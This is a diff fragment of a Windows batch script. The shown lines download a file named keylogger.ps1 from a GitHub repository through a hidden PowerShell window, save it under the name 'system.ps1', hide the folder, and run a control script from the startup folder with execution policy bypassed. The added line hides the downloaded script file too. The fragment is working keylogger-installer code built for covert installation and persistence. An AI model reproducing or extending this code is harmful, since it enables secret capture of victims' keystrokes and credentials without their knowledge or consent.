@@ -10,6 +10,7 @@ mkdir script
 cd script
 powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/keylogger.ps1' -OutFile 'system.ps1'"
 attrib +h C:\Users\%name%\script
+attrib +h C:\Users\%name%\script\system.ps1
 cd %start_up%
 start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\control.cmd
 
